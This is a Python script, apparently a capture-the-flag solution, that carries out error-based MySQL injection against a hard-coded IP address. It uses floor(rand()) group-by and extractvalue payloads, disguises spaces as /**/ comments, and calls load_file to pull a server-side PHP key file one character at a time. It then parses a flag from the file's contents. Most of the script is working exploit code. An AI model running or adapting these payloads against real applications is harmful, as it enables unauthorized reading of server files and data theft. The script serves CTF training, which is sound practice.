#coding=utf8

# 求解报错注入

from __future__ import print_function, unicode_literals
import requests
import re
import sys
import codecs
#import win32console

def cp65001(name):
    if name.lower() == 'cp65001':
        return codecs.lookup('utf-8')
codecs.register(cp65001)

reload(sys)
sys.setdefaultencoding('utf-8')
sys.stdout = codecs.getwriter('utf8')(sys.stdout)
sys.stderr = codecs.getwriter('utf8')(sys.stderr)
#import codecs
#codecs.register(lambda name: codecs.lookup('utf-8') if name == 'cp65001' else None)

url = 'http://103.238.227.13:10088/?id=1'
checkstr = '密码不正确'
result = ''

replaceSpace = lambda s: s.replace(r' ','/**/')

str2hex = lambda s: '0x' + ''.join(map(lambda c: hex(ord(c)).replace('0x',''),[i for i in s]))

#http://103.238.227.13:10088/?id=1/**/and(select/**/1/**/from/**/(select/**/count(*),concat(floor(rand(0)*2),0x5e5e5e,substr((select/**/load_file(0x2f7661722f746573742f6b65795f312e706870)),3,1),0x5e5e5e)/**/x/**/from/**/information_schema.columns/**/group/**/by/**/x)/**/y)
payload = '''id=1 and(select 1 from (select count(*),concat(floor(rand(0)*2),0x5e5e5e,hex(substr((select load_file(0x2f7661722f746573742f6b65795f312e706870)),{:d},1)),0x5e5e5e) x from information_schema.columns group by x) y)'''
#payload = '''1%0aand%0a(extractvalue(1,concat(0x7e,substr(hex(load_file(0x2f7661722f746573742f6b65795f312e706870))%0afrom%0a161%0afor%0a20),0x7e)))'''

s = ''
def getOneChar(  pos ):
    requrl = url + replaceSpace(payload).format(pos)
    r = requests.get(requrl)
    r.encoding = 'utf-8'

    print(requrl)
    pattern = re.compile(r"\^\^\^(.+)\^\^\^")
    m = pattern.search(r.text)
    if m != None :
        return chr(int('0x'+m.group(1),0))   
    
    aa = [i for i in r.text]
    #print(aa)
    #print(checkstr)

    #print(o)
 

#s = str2hex('/var/test/key_1.php')  # 0x2f7661722f746573742f6b65795f312e706870
#print s

'''
for i in range(1,149):
    v = getOneChar(i)
    s = s + v
'''
s = '<?php fdsafasfdsafidsafdsaifdsakfdsaifdsafdsafdsafdsafkdsa;fdsafdsafsdafdsafas0hfdsg9Flag:"7249f5a7fd1de602b30e6f39aea6193a"fsdafsafdsafdsafdsafa ?>'
print(s)
p = re.compile(r'Flag:\"(.+)\"')
flag = p.search(s).group(1)
print(flag)

h2v = lambda a: int(ord(a) - ord('a') + 10) if (a >= 'a' and a <= 'f') else int(ord(a) - ord('0'))
enstr2 = ''
bytearr=[]
for p in range(int(len(flag)/2)):

    c1=flag[2*p]
    c2=flag[2*p+1]
   
    byte = ((h2v(c1) * 16) + h2v(c2))    
    print(hex(byte))
    bytearr.append(byte)
print(bytearr)